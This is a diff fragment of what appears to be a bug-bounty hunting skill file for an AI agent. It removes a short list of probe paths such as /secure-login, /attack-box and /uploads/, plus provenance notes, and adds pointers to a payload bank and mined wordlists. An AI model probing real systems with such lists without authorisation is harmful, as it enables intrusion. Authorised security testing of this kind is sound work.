-/secure-login
-/forum/
-/attack-box
-/hate-mail-generator/templates/
-/api/ping
-/uploads/
-/dk
-/custom-email
-/user/
-/forum
-/templates
-/path
-/space
-```
-
-## Source skills merged into this topic
-
-- `h1skills` — `hackerone-other`
-- `hunting` — `misc`
-- `hunting` — `other`
-- `cbh` — `hunt-misc`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `references/upstream-assets/` — 4 companion files
-- `../../upstream/` — complete unmodified archives of all five source repositories
+- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
+- `references/payloads.md` — curated payload bank + upstream payload references
+- `references/wordlists/` — 2 mined paths/params/payload lists
 - `bbhunt-methodology` — orchestrator, state machine and class router
